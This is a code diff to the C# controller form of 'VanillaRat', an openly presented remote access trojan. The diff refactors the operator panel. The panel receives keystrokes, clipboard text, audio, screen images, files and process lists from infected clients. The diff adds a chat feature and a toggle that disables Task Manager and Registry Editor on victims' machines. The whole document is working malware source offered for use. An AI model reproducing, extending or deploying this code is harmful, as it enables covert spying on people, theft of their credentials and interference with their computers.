@@ -5,7 +5,6 @@ using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Linq;
-using System.Net;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -22,34 +21,62 @@ namespace VanillaRat
 {
     public partial class Main : Form
     {
-        public ComputerInformation CI = new ComputerInformation();
-        public ClientRunningApps CRA = new ClientRunningApps();
-        public ClipboardTextViewer CTV = new ClipboardTextViewer();
-        public int CurrentSelectedID;
-        public FileExplorer FE = new FileExplorer();
-        public HardwareUsageViewer HUV = new HardwareUsageViewer();
-        public Image ImageToDisplay;
-        public Keylogger K = new Keylogger();
-        public OpenWebsite OW = new OpenWebsite();
-        public RDC RDC = new RDC();
-        public AudioRecorder AR = new AudioRecorder();
-        public int ServerUpdateInterval = Properties.Settings.Default.UpdateInterval;       
-        private Settings.Values Settings;
-        public bool RDActive { get; set; }
-
         public Main()
         {
             InitializeComponent();
             Opacity = 0;
             MinimizeBox = false;
             MaximizeBox = false;
-            Text = "Vanilla Rat - Offline"; 
+            Text = "Vanilla Rat - Offline";
             lblStatus.ForeColor = Color.Red;
             lblStatus.Text = "Offline";
             GetDataLoop.Interval = ServerUpdateInterval;
             TempDataHelper.CanDownload = true;
             TempDataHelper.CanUpload = true;
-        }         
+        }
+
+        #region Declarations
+        public AudioRecorder AR = new AudioRecorder();
+        public ComputerInformation CI = new ComputerInformation();
+        public ClientRunningApps CRA = new ClientRunningApps();
+        public ClipboardTextViewer CTV = new ClipboardTextViewer();
+        public Chat C = new Chat();
+        public int CurrentSelectedID;
+        public FileExplorer FE = new FileExplorer();
+        public HardwareUsageViewer HUV = new HardwareUsageViewer();
+        public Image ImageToDisplay;
+        public Keylogger K = new Keylogger();
+        private NotificationBox NB = new NotificationBox();
+        public OpenWebsite OW = new OpenWebsite();
+        public bool RDActive;
+        public RDC RDC = new RDC();
+        public int ServerUpdateInterval = Properties.Settings.Default.UpdateInterval;
+        private Settings.Values Settings;       
+        #endregion
+
+        #region Extra
+
+        //Open github page (I like views)
+        private void lblVersion_Click(object sender, EventArgs e)
+        {
+            Process.Start("https://github.com/DannyTheSloth/VanillaRat");
+        }
+
+        //Get client tag from connection id
+        private string GetClientTagFromId(int ConnectionId)
+        {
+            for (int n = lbConnectedClients.Items.Count - 1; n >= 0; --n)
+            {
+                ListViewItem LVI = lbConnectedClients.Items[n];
+                if (Convert.ToInt16(LVI.SubItems[0].Text) == ConnectionId)
+                {
+                    return LVI.SubItems[2].Text;
+                }
+            }
+            return "Client";
+        }
+
+        #endregion Extra
 
         #region Server Controls
 
@@ -109,35 +136,52 @@ namespace VanillaRat
 
         #endregion Builder & Settings
 
-        #region Server Code
+        #region Main Server Code
 
+        #region Client Information
         //Gets client tag from client then updates list item
         private void AddClientTag(int ConnectionId, string Tag)
         {
             for (int n = lbConnectedClients.Items.Count - 1; n >= 0; --n)
             {
                 ListViewItem LVI = lbConnectedClients.Items[n];
-                if (LVI.SubItems[0].Text.Contains(ConnectionId.ToString())) lbConnectedClients.Items[n].SubItems[2].Text = Tag;
+                if (LVI.SubItems[0].Text.Contains(ConnectionId.ToString()))
+                    lbConnectedClients.Items[n].SubItems[2].Text = Tag;
+                if (Settings.GetNotifyValue())
+                {
+                    NB = new NotificationBox();
+                    NB.ClientTag = Tag;
+                    NB.IP = MainServer.GetClientAddress(ConnectionId);
+                    NB.Show();
+                }
             }
         }
+
         //Gets anti-virus from client then updates list item
         private void AddAntiVirus(int ConnectionId, string AntiVirus)
         {
             for (int n = lbConnectedClients.Items.Count - 1; n >= 0; --n)
             {
                 ListViewItem LVI = lbConnectedClients.Items[n];
-                if (LVI.SubItems[0].Text.Contains(ConnectionId.ToString())) lbConnectedClients.Items[n].SubItems[3].Text = AntiVirus;
+                if (LVI.SubItems[0].Text.Contains(ConnectionId.ToString()))
+                    lbConnectedClients.Items[n].SubItems[3].Text = AntiVirus;
             }
         }
+
         //Gets operating system from client then updates list item
         private void AddOperatingSystem(int ConnectionId, string OperatingSystem)
         {
             for (int n = lbConnectedClients.Items.Count - 1; n >= 0; --n)
             {
                 ListViewItem LVI = lbConnectedClients.Items[n];
-                if (LVI.SubItems[0].Text.Contains(ConnectionId.ToString())) lbConnectedClients.Items[n].SubItems[4].Text = OperatingSystem;
+                if (LVI.SubItems[0].Text.Contains(ConnectionId.ToString()))
+                    lbConnectedClients.Items[n].SubItems[4].Text = OperatingSystem;
             }
         }
+        #endregion
+
+        #region Data Handler
+
         //Gets all data that has been sent to the server and handles it
         public void GetRecievedData()
         {
@@ -147,11 +191,13 @@ namespace VanillaRat
                 {
                     case EventType.Connected:
                         lbConnectedClients.Items.Add(new ListViewItem(new[]
-                            {Data.connectionId.ToString(), MainServer.GetClientAddress(Data.connectionId), "N/A", "N/A", "N/A"}));                       
+                        {
+                            Data.connectionId.ToString(), MainServer.GetClientAddress(Data.connectionId), "N/A", "N/A",
+                            "N/A"
+                        }));
                         break;
 
                     case EventType.Disconnected:
-                        if (bwUpdateImage.IsBusy) bwUpdateImage.CancelAsync();
                         for (int n = lbConnectedClients.Items.Count - 1; n >= 0; --n)
                         {
                             ListViewItem LVI = lbConnectedClients.Items[n];
@@ -167,7 +213,7 @@ namespace VanillaRat
                 }
         }
 
-        //Handles data by switching between byte headers 
+        //Handles data by switching between byte headers
         public void HandleData(int ConnectionId, byte[] RawData)
         {
             ClientRunningApps CRA;
@@ -234,74 +280,112 @@ namespace VanillaRat
                 case 10: //Hardware Usage Type
                     UpdateHardwareUsage(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                     break;
+
                 case 11: //Keystroke Type
                     UpdateKeylogger(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                     break;
+
                 case 12: //Current Window Type
                     UpdateCurrentWindow(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                     break;
+
                 case 13: //Audio Recording Type
                     UpdateAudioRecording(ConnectionId, ToProcess);
                     break;
+
                 case 14: //Anti-Virus Tag
                     AddAntiVirus(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                     break;
+
                 case 15: //Windows Version Tag
                     AddOperatingSystem(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                     break;
+
+                case 16: //Message Type
+                    AddMessage(ConnectionId, Encoding.ASCII.GetString(ToProcess));
+                    break;
             }
         }
+        #endregion
 
-        //Updates currently selected window on keylogger 
+        #region Update Functions
+
+        //Add message to chat
+        public void AddMessage(int ConnectionId, string Message)
+        {
+            foreach (Chat C in Application.OpenForms.OfType<Chat>())
+                if (C.Visible && C.ConnectionID == ConnectionId && C.Update)
+                {
+                    if (string.IsNullOrWhiteSpace(C.txtChat.Text))
+                    {
+                        C.txtChat.Text = GetClientTagFromId(ConnectionId) + ": " + Message;
+                    }
+                    else
+                    {
+                        C.txtChat.AppendText(Environment.NewLine + GetClientTagFromId(ConnectionId) + ": " + Message);
+                    }
+                }
+        }
+
+        //Update audio recording
         public void UpdateAudioRecording(int ConnectionId, byte[] Audio)
         {
-            if (AR.Visible && AR.ConnectionID == ConnectionId)
-            {
-                AR.BytesToPlay = Audio;
-            }
-            else
-            {
-                AR = new AudioRecorder();
-                AR.ConnectionID = ConnectionId;
-                AR.Text = "Audio Recorder - " + ConnectionId;
-                AR.Show();
-                if (AR.ConnectionID == ConnectionId)
+            foreach (AudioRecorder AR in Application.OpenForms.OfType<AudioRecorder>())
+                if (AR.Visible && AR.ConnectionID == ConnectionId && AR.Update)
                 {
                     AR.BytesToPlay = Audio;
+                    return;
                 }
-            }
-        }
-        public void UpdateCurrentWindow(int ConnectionId, string WindowName)
-        {
-            if (K.Visible && K.Text == "Keylogger - " + ConnectionId) K.txtCurrentWindow.Text = WindowName;
+
+            AR = new AudioRecorder();
+            AR.ConnectionID = ConnectionId;
+            AR.Text = "Audio Recorder - " + ConnectionId;
+            AR.Show();
+            if (AR.ConnectionID == ConnectionId) AR.BytesToPlay = Audio;
         }
 
-        //Updates keylogger 
+        //Updates currently selected window on keylogger
+        public void UpdateCurrentWindow(int ConnectionId, string WindowName)
+        {
+            foreach (Keylogger K in Application.OpenForms.OfType<Keylogger>())
+                if (K.Visible && K.ConnectionId == ConnectionId && K.Update)
+                    K.txtCurrentWindow.Text = WindowName;
+        }
+
+        //Updates keylogger
         public void UpdateKeylogger(int ConnectionId, string Keystroke)
         {
-            if (K.Visible && K.Text == "Keylogger - " + ConnectionId)
-            {
-                K.txtKeylogger.AppendText(Keystroke + " ");
-            }
-            else
-            {
-                K = new Keylogger();
-                K.Show();
-                K.ConnectionId = ConnectionId;
-                K.Text = "Keylogger - " + ConnectionId;
-                if (K.ConnectionId == ConnectionId)
+            foreach (Keylogger K in Application.OpenForms.OfType<Keylogger>())
+                if (K.Visible && K.ConnectionId == ConnectionId && K.Update)
                 {
-                    if (string.IsNullOrWhiteSpace(K.txtKeylogger.Text))
-                        K.txtKeylogger.Text = Keystroke;
-                    else
-                        K.txtKeylogger.Text += Environment.NewLine + Keystroke;
+                    K.txtKeylogger.AppendText(Keystroke + " ");
+                    return;
                 }
-            }
+
+            K = new Keylogger();
+            K.Show();
+            K.ConnectionId = ConnectionId;
+            K.Text = "Keylogger - " + ConnectionId;
+            if (K.ConnectionId == ConnectionId) K.txtKeylogger.AppendText(Keystroke + " ");
         }
 
         //Updates hardware usage data
         public void UpdateHardwareUsage(int ConnectionId, string UsageData)
         {
+            foreach (HardwareUsageViewer HUV in Application.OpenForms.OfType<HardwareUsageViewer>())
+                if (HUV.Visible && HUV.ConnectionID == ConnectionId && HUV.Update)
+                {
+                    double CPUUsageRaw = Convert.ToDouble(Functions.GetSubstringByString("{", "}", UsageData));
+                    string CPUUsageString = Convert.ToInt32(CPUUsageRaw).ToString();
+                    string RamAmount = Functions.GetSubstringByString("[", "]", UsageData);
+                    double DiskUsageRaw = Convert.ToDouble(Functions.GetSubstringByString("<", ">", UsageData));
+                    string DiskUsageString = Convert.ToInt32(DiskUsageRaw).ToString();
+                    HUV.txtAvailableRam.Text = RamAmount;
+                    HUV.txtCpuUsage.Text = CPUUsageString;
+                    HUV.txtDiskUsage.Text = DiskUsageString;
+                    return;
+                }
+
             if (HUV.Visible && HUV.Text == "Hardware Usage Viewer - " + ConnectionId)
             {
                 double CPUUsageRaw = Convert.ToDouble(Functions.GetSubstringByString("{", "}", UsageData));
@@ -313,76 +397,54 @@ namespace VanillaRat
                 HUV.txtCpuUsage.Text = CPUUsageString;
                 HUV.txtDiskUsage.Text = DiskUsageString;
             }
-            else
-            {
-                HUV = new HardwareUsageViewer();
-                HUV.Show();
-                HUV.ConnectionID = ConnectionId;
-                HUV.Text = "Hardware Usage Viewer - " + ConnectionId;
-                if (HUV.ConnectionID == ConnectionId)
-                {
-                }
-            }
+
+            HUV = new HardwareUsageViewer();
+            HUV.Show();
+            HUV.ConnectionID = ConnectionId;
+            HUV.Text = "Hardware Usage Viewer - " + ConnectionId;
         }
 
         //Updates clipboard text
         public void UpdateClipboardTextViewer(int ConnectionId, string ClipboardText)
         {
-            if (CTV.Visible && CTV.Text == "Clipboard Text Viewer - " + ConnectionId)
-            {
-                CTV.txtClipboardText.Text += Environment.NewLine;
-                CTV.txtClipboardText.Text += DateTime.Now.ToString();
-                CTV.txtClipboardText.Text += Environment.NewLine;
-                CTV.txtClipboardText.Text += ClipboardText;
-            }
-            else
-            {
-                CTV = new ClipboardTextViewer();
-                CTV.Show();
-                CTV.ConnectionID = ConnectionId;
-                CTV.Text = "Clipboard Text Viewer - " + ConnectionId;
-                if (CTV.ConnectionID == ConnectionId)
+            foreach (ClipboardTextViewer CTV in Application.OpenForms.OfType<ClipboardTextViewer>())
+                if (CTV.Visible && CTV.ConnectionID == ConnectionId && CTV.Update)
                 {
-                    CTV.txtClipboardText.Text = DateTime.Now.ToString();
+                    CTV.txtClipboardText.Text += Environment.NewLine;
+                    CTV.txtClipboardText.Text += DateTime.Now.ToString();
                     CTV.txtClipboardText.Text += Environment.NewLine;
                     CTV.txtClipboardText.Text += ClipboardText;
+                    return;
                 }
+
+            CTV = new ClipboardTextViewer();
+            CTV.Show();
+            CTV.ConnectionID = ConnectionId;
+            CTV.Text = "Clipboard Text Viewer - " + ConnectionId;
+            if (CTV.ConnectionID == ConnectionId)
+            {
+                CTV.txtClipboardText.Text = DateTime.Now.ToString();
+                CTV.txtClipboardText.Text += Environment.NewLine;
+                CTV.txtClipboardText.Text += ClipboardText;
             }
         }
 
         //Updates file browser current directory
         public void UpdateCurrentDirectory(int ConnectionId, string CurrentDirectory)
         {
-            if (FE.Visible && FE.Text == "File Explorer - " + ConnectionId)
-                FE.txtCurrentDirectory.Text = CurrentDirectory;
+            foreach (FileExplorer FE in Application.OpenForms.OfType<FileExplorer>())
+                if (FE.Visible && FE.ConnectionID == ConnectionId && FE.Update)
+                    FE.txtCurrentDirectory.Text = CurrentDirectory;
         }
 
         //Updates files in file browser
         public void UpdateFiles(int ConnectionId, string Files, string CurrentDirectory)
         {
-            string[] FilesArrayRaw = Files.Split(new[] {"]["}, StringSplitOptions.None);
+            string[] FilesArrayRaw = Files.Split(new[] { "][" }, StringSplitOptions.None);
             string[] FilesArray = FilesArrayRaw.Skip(1).ToArray();
-            List<string> FilesList = new List<string>(FilesArray);
-            if (FE.Visible && FE.Text == "File Explorer - " + ConnectionId)
+            foreach (FileExplorer FE in Application.OpenForms.OfType<FileExplorer>())
             {
-                FE.lbFiles.Items.Clear();
-                foreach (string S in FilesArray)
-                {
-                    string Filename = Functions.GetSubstringByString("{", "}", S);
-                    string Extension = Functions.GetSubstringByString("<", ">", S);
-                    string DateCreated = Functions.GetSubstringByString("[", "]", S);
-                    string[] ToAdd = {Filename, Extension, DateCreated};
-                    var ListItem = new ListViewItem(ToAdd);
-                    FE.lbFiles.Items.Add(ListItem);
-                }
-            }
-            else
-            {
-                FE = new FileExplorer();
-                FE.Show();
-                FE.ConnectionID = ConnectionId;
-                FE.Text = "File Explorer - " + FE.ConnectionID;
-                if (FE.ConnectionID == ConnectionId)
+                if (FE.Visible && FE.ConnectionID == ConnectionId && FE.Update)
                 {
                     FE.lbFiles.Items.Clear();
                     foreach (string S in FilesArray)
@@ -392,8 +454,27 @@ namespace VanillaRat
                         string DateCreated = Functions.GetSubstringByString("[", "]", S);
                         string[] ToAdd = {Filename, Extension, DateCreated};
                         var ListItem = new ListViewItem(ToAdd);
-                        FE.lbFiles.Items.Add(ListItem);
+                        FE.lbFiles.Items.Add(ListItem);                       
                     }
+                    return;
+                }
+            }
+
+            FE = new FileExplorer();
+            FE.Show();
+            FE.ConnectionID = ConnectionId;
+            FE.Text = "File Explorer - " + FE.ConnectionID;
+            if (FE.ConnectionID == ConnectionId)
+            {
+                FE.lbFiles.Items.Clear();
+                foreach (string S in FilesArray)
+                {
+                    string Filename = Functions.GetSubstringByString("{", "}", S);
+                    string Extension = Functions.GetSubstringByString("<", ">", S);
+                    string DateCreated = Functions.GetSubstringByString("[", "]", S);
+                    string[] ToAdd = { Filename, Extension, DateCreated };
+                    var ListItem = new ListViewItem(ToAdd);
+                    FE.lbFiles.Items.Add(ListItem);
                 }
             }
         }
@@ -403,54 +484,36 @@ namespace VanillaRat
         {
             string[] InfoArray = Info.Split(',');
             List<string> InfoList = new List<string>(InfoArray);
-            if (CI.Visible && CI.Text == "Computer Information - " + ConnectionId)
-            {
-                CI.lbInformation.Items.Clear();
-                CI.lbInformation.Items.AddRange(InfoList.ToArray<string>());
-                CI.lbInformation.Items.Remove("");
-            }
-            else
-            {
-                CI = new ComputerInformation();
-                CI.Show();
-                CI.ConnectionID = ConnectionId;
-                CI.Text = "Computer Information - " + CI.ConnectionID;
-                if (CI.ConnectionID == ConnectionId)
+            foreach (ComputerInformation CI in Application.OpenForms.OfType<ComputerInformation>())
+                if (CI.Visible && CI.ConnectionID == ConnectionId && CI.Update)
                 {
                     CI.lbInformation.Items.Clear();
-                    CI.lbInformation.Items.AddRange(InfoList.ToArray());
+                    CI.lbInformation.Items.AddRange(InfoList.ToArray<string>());
                     CI.lbInformation.Items.Remove("");
+                    return;
                 }
+
+            CI = new ComputerInformation();
+            CI.Show();
+            CI.ConnectionID = ConnectionId;
+            CI.Text = "Computer Information - " + CI.ConnectionID;
+            if (CI.ConnectionID == ConnectionId)
+            {
+                CI.lbInformation.Items.Clear();
+                CI.lbInformation.Items.AddRange(InfoList.ToArray());
+                CI.lbInformation.Items.Remove("");
             }
         }
 
         //Updates process list
         public void UpdateRunningAppsListbox(int ConnectionId, string Processes)
         {
-            string[] ProcessesArrayRaw = Processes.Split(new[] {"]["}, StringSplitOptions.None);
+            string[] ProcessesArrayRaw = Processes.Split(new[] { "][" }, StringSplitOptions.None);
             string[] ProcessesArray = ProcessesArrayRaw.Skip(1).ToArray();
             List<string> ProcessesList = new List<string>(ProcessesArray);
             ProcessesList.AddRange(ProcessesArray);
-            if (CRA.Visible && CRA.Text == "Running Applications - " + ConnectionId)
-            {
-                CRA.lbRunningProcesses.Items.Clear();
-                foreach (string S in ProcessesArray)
-                {
-                    string PName = Functions.GetSubstringByString("{", "}", S);
-                    string PID = Functions.GetSubstringByString("<", ">", S);
-                    string PWindow = Functions.GetSubstringByString("[", "]", S);
-                    string[] ToAdd = {PName, PID, PWindow};
-                    var ListItem = new ListViewItem(ToAdd);
-                    CRA.lbRunningProcesses.Items.Add(ListItem);
-                }
-            }
-            else
-            {
-                CRA = new ClientRunningApps();
-                CRA.Show();
-                CRA.ConnectionID = ConnectionId;
-                CRA.Text = "Running Applications - " + CRA.ConnectionID;
-                if (CRA.ConnectionID == ConnectionId)
+            foreach (ClientRunningApps CRA in Application.OpenForms.OfType<ClientRunningApps>())
+                if (CRA.Visible && CRA.ConnectionID == ConnectionId && CRA.Update)
                 {
                     CRA.lbRunningProcesses.Items.Clear();
                     foreach (string S in ProcessesArray)
@@ -458,28 +521,50 @@ namespace VanillaRat
                         string PName = Functions.GetSubstringByString("{", "}", S);
                         string PID = Functions.GetSubstringByString("<", ">", S);
                         string PWindow = Functions.GetSubstringByString("[", "]", S);
-                        string[] ToAdd = {PName, PID, PWindow};
+                        string[] ToAdd = { PName, PID, PWindow };
                         var ListItem = new ListViewItem(ToAdd);
                         CRA.lbRunningProcesses.Items.Add(ListItem);
                     }
+
+                    return;
+                }
+
+            CRA = new ClientRunningApps();
+            CRA.Show();
+            CRA.ConnectionID = ConnectionId;
+            CRA.Text = "Running Applications - " + CRA.ConnectionID;
+            if (CRA.ConnectionID == ConnectionId)
+            {
+                CRA.lbRunningProcesses.Items.Clear();
+                foreach (string S in ProcessesArray)
+                {
+                    string PName = Functions.GetSubstringByString("{", "}", S);
+                    string PID = Functions.GetSubstringByString("<", ">", S);
+                    string PWindow = Functions.GetSubstringByString("[", "]", S);
+                    string[] ToAdd = { PName, PID, PWindow };
+                    var ListItem = new ListViewItem(ToAdd);
+                    CRA.lbRunningProcesses.Items.Add(ListItem);
                 }
             }
         }
 
-        //Loops data receiving 
+        //Loops data receiving
         private void GetDataLoop_Tick(object sender, EventArgs e)
         {
             GetRecievedData();
         }
+        #endregion
 
-        #endregion Server Code
+        #endregion
 
         #region Form
+
         //On form load
         private void Main_Load(object sender, EventArgs e)
         {
-            FadeIn(5);   
+            FadeIn(5);
         }
+
         //Fade form in
         private async void FadeIn(int UpdateInterval)
         {
@@ -488,13 +573,14 @@ namespace VanillaRat
                 await Task.Delay(UpdateInterval);
                 Opacity += 0.05;
             }
+
             Opacity = 1;
         }
+
         //On form close
         private void Main_FormClosing(object sender, FormClosingEventArgs e)
-        {           
+        {
             MainServer.Stop();
-            if (bwUpdateImage.IsBusy) bwUpdateImage.CancelAsync();         
         }
 
         //Prevents column size changing
@@ -520,8 +606,44 @@ namespace VanillaRat
 
         #endregion Form
 
-        #region Client Functions      
+        #region Client Functions
 
+        //Toggle Anti-Process
+        private void btnToggleAntiProcess_Click(object sender, EventArgs e)
+        {
+            if (lbConnectedClients.SelectedItems.Count < 0)
+            {
+                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+            int ConnectionId = CurrentSelectedID;
+            DialogResult DR =
+                MessageBox.Show(
+                    "Are you sure you would like to toggle Anti-Process? This will either disable or enable processes such as task manager, and registry editor.",
+                    "Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
+            if (DR == DialogResult.Yes)
+                MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("ToggleAntiProcess"));
+
+        }
+
+        //Open chat with client
+        private void btnOpenChat_Click(object sender, EventArgs e)
+        {
+            if (lbConnectedClients.SelectedItems.Count < 0)
+            {
+                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+            int ConnectionId = CurrentSelectedID;
+            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("OpenChat"));
+            foreach (Chat C in Application.OpenForms.OfType<Chat>())
+                if (C.Visible && C.ConnectionID == ConnectionId)
+                    return;
+            C = new Chat();
+            C.ConnectionID = ConnectionId;
+            C.Text = "Chat - " + ConnectionId;
+            C.Show();
+        }
         //Get running processes
         private void btnGetRunningApps_Click(object sender, EventArgs e)
         {
@@ -535,8 +657,8 @@ namespace VanillaRat
             MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("GetProcesses"));
         }
 
-        //Open website 
-        private void btnOpenWebsite_Click(object sender, EventArgs e)
+        //Open website
+        private void btnOpenWebsite(object sender, EventArgs e)
         {
             if (lbConnectedClients.SelectedItems.Count < 0)
             {
@@ -545,16 +667,13 @@ namespace VanillaRat
             }
 
             int ConnectionId = CurrentSelectedID;
-            if (OW.Visible && OW.Text == "Open Website - " + ConnectionId)
-            {
-            }
-            else
-            {
-                OW = new OpenWebsite();
-                OW.Show();
-                OW.ConnectionID = ConnectionId;
-                OW.Text = "Open Website - " + OW.ConnectionID;
-            }
+            foreach (OpenWebsite OW in Application.OpenForms.OfType<OpenWebsite>())
+                if (OW.Visible && OW.ConnectionID == ConnectionId)
+                    return;
+            OW = new OpenWebsite();
+            OW.Show();
+            OW.ConnectionID = ConnectionId;
+            OW.Text = "Open Website - " + OW.ConnectionID;           
         }
 
         //Get computer information
@@ -570,7 +689,7 @@ namespace VanillaRat
             MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("GetComputerInfo"));
         }
 
-        //Raise to admin 
+        //Raise to admin
         private void btnRaisePerms_Click(object sender, EventArgs e)
         {
             if (lbConnectedClients.SelectedItems.Count < 0)
@@ -622,7 +741,7 @@ namespace VanillaRat
             MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("DisconnectClient"));
         }
 
-        //Show client console
+        //Show client console (No longer working due to FreeConsole function on client side to allow for chat.)
         private void btnShowClientConsole_Click(object sender, EventArgs e)
         {
             if (lbConnectedClients.SelectedItems.Count < 0)
@@ -730,7 +849,7 @@ namespace VanillaRat
         }
 
         //Start keylogger
-        private void btnStartLiveKeylogger_Click(object sender, EventArgs e)
+        private void btnStartKL_Click(object sender, EventArgs e)
         {
             if (lbConnectedClients.SelectedItems.Count < 0)
             {
@@ -740,33 +859,35 @@ namespace VanillaRat
 
             int ConnectionId = CurrentSelectedID;
             MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StartKL"));
-            if (!K.Visible)
-            {
-                K = new Keylogger();
-                K.ConnectionId = ConnectionId;
-                K.Text = "Keylogger - " + ConnectionId;
-                K.Show();
-            }
+            foreach (Keylogger KL in Application.OpenForms.OfType<Keylogger>())
+                if (KL.Visible && KL.ConnectionId == ConnectionId)
+                    return;
+
+            K = new Keylogger();
+            K.ConnectionId = ConnectionId;
+            K.Text = "Keylogger - " + ConnectionId;
+            K.Show();
         }
+
         //Open audio recorder
-        private void btnAudioRecorder_Click(object sender, EventArgs e)
+        private void btnOpenAudioRecorder_Click(object sender, EventArgs e)
         {
-            MessageBox.Show("Coming Soon", "Coming Soon", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            return; //Not yet complete; Trying to find a good microphone to byte[] solution for client.
             if (lbConnectedClients.SelectedItems.Count < 0)
             {
                 MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;
             }
+
             int ConnectionId = CurrentSelectedID;
-            if (!AR.Visible)
-            {
-                AR = new AudioRecorder();
-                AR.ConnectionID = ConnectionId;
-                AR.Text = "Audio Recorder - " + ConnectionId;
-                AR.Show();
-            }
+            foreach (AudioRecorder AR in Application.OpenForms.OfType<AudioRecorder>())
+                if (AR.Visible && AR.ConnectionID == ConnectionId)
+                    return;
+            AR = new AudioRecorder();
+            AR.ConnectionID = ConnectionId;
+            AR.Text = "Audio Recorder - " + ConnectionId;
+            AR.Show();
         }
+
         #endregion Client Functions
 
         #region Remote Desktop
@@ -778,7 +899,7 @@ namespace VanillaRat
             {
                 try
                 {
-                    IUnsafeCodec UC = new UnsafeStreamCodec(75);
+                    IUnsafeCodec UC = new UnsafeStreamCodec(60);
                     return UC.DecodeData(MS);
                 }
                 catch
@@ -789,7 +910,7 @@ namespace VanillaRat
         }
 
         //Start remote desktop
-        private void btnStartRemoteDesktop_Click(object sender, EventArgs e)
+        private void btnRemoteDesktop_Click(object sender, EventArgs e)
         {
             try
             {
@@ -802,76 +923,49 @@ namespace VanillaRat
                 int ConnectionId = CurrentSelectedID;
                 if (RDActive)
                 {
-                    MessageBox.Show(
-                        "Error: Remote desktop viewer is already active! Please close remote desktop viewer before continuing.",
-                        "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    MessageBox.Show("Remote desktop is already active!", "Error", MessageBoxButtons.OK,
+                        MessageBoxIcon.Error);
                     return;
                 }
 
+                if (bwUpdateImage.IsBusy) return;
                 RDActive = true;
-                if (bwUpdateImage.IsBusy) bwUpdateImage.CancelAsync();
+                MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StartRD"));
                 RDC = new RDC();
                 RDC.ConnectionID = ConnectionId;
                 RDC.Text = "Remote Desktop Viewer - " + ConnectionId;
                 RDC.Show();
                 bwUpdateImage.RunWorkerAsync();
-
-                MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StartRD"));
             }
             catch
             {
             }
         }
 
-        //Stop remote desktop
-        private void btnStopRemoteDesktop_Click(object sender, EventArgs e)
+        //Update picture box image
+        private async void bwUpdateImage_DoWork(object sender, DoWorkEventArgs e)
         {
-            if (lbConnectedClients.SelectedItems.Count < 0)
-            {
-                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                return;
-            }
-
-            int ConnectionId = CurrentSelectedID;
-            RDActive = false;
-            if (!bwUpdateImage.IsBusy) return;
-            RDC.Close();
-            bwUpdateImage.CancelAsync();
-            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StopRD"));
-        }
-        //Updates image in background worker
-        private void bwUpdateImage_DoWork(object sender, DoWorkEventArgs e)
-        {
-            while (RDC.Visible)
-            {
+            while (RDActive)
                 try
                 {
+                    if (!RDC.Visible)
+                    {
+                        RDActive = false;
+                        break;
+                    }
+
                     var Image = ImageToDisplay;
                     if (RDC.pbDesktop.InvokeRequired)
-                        RDC.pbDesktop.Invoke((MethodInvoker)delegate { RDC.pbDesktop.Image = Image; });
+                        RDC.pbDesktop.Invoke((MethodInvoker) delegate { RDC.pbDesktop.Image = Image; });
                     else
                         RDC.pbDesktop.Image = Image;
-                    Thread.Sleep(ServerUpdateInterval);
+                    await Task.Delay(50);
                 }
                 catch
                 {
+
                 }
-            }
-
-            RDActive = false;
         }
-        #endregion
-
-        #region Extra
-
-        //Open github page (I like views)
-        private void lblVersion_Click(object sender, EventArgs e)
-        {
-            Process.Start("https://github.com/DannyTheSloth/VanillaRat");
-        }
-
-
-        #endregion
-        
+        #endregion Remote Desktop       
     }
 }
